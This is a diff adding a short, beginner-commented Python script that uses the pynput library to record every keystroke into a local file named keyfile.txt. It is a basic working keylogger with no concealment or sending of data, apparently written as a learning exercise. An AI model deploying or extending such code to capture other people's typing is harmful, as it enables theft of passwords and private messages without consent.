@@ -1,0 +1,27 @@
+## You need to import Keyboard as that is the libary for these methods to work.
+
+from pynput import keyboard
+
+## This defines the function of every key you type and converting it into a string. 
+
+def keyPressed(key):
+    print(str(key))
+    with open("keyfile.txt", "a") as logKey: ##Keyfile.txt is where the code will output all the pressed keys too. 
+        try:
+             char = key.char
+             logKey.write(char)
+        except AttributeError:
+            if key == keyboard.Key.space: # this so the code understands when the user does a space to make it neater
+                logKey.write(" ")
+            elif key == keyboard.Key.backspace:
+                logKey.write(" ")
+            elif key == keyboard.Key.enter:
+                logKey.write("\n")
+
+
+if __name__ == '__main__':
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input()
+    
+    
